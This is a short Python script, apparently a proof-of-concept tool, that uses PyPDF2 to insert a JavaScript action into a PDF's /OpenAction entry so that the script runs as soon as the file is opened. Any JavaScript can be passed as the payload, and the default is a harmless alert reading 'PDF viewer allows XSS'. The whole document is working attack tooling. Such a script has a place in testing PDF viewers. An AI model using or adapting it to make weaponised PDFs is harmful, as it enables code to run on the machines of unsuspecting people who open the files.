import argparse
from PyPDF2 import PdfReader, PdfWriter
from PyPDF2.generic import DictionaryObject, NameObject, TextStringObject

def inject_js(input_path, output_path, js_payload):
    reader = PdfReader(input_path)
    writer = PdfWriter()

    for page in reader.pages:
        writer.add_page(page)

    js_action = DictionaryObject()
    js_action.update({
        NameObject("/Type"): NameObject("/Action"),
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): TextStringObject(js_payload)
    })

    action_ref = writer._add_object(js_action)
    writer._root_object.update({NameObject("/OpenAction"): action_ref})

    with open(output_path, "wb") as f:
        writer.write(f)

    print(f"[+] PDF saved to: {output_path}")

if __name__ == "__main__":
    default_payload = 'app.alert("PDF viewer allows XSS");\n'

    parser = argparse.ArgumentParser(
        description="Inject JavaScript into a PDF file.",
        argument_default=argparse.SUPPRESS
    )
    parser.add_argument("--input", "-i", required=True, help="Input PDF file path")
    parser.add_argument("--output", "-o", required=True, help="Output PDF file path")
    parser.add_argument(
        "--payload", "-p",
        default=default_payload,
        help=f'JavaScript payload to inject (default: {repr(default_payload)})'
    )

    args = parser.parse_args()
    inject_js(args.input, args.output, args.payload)
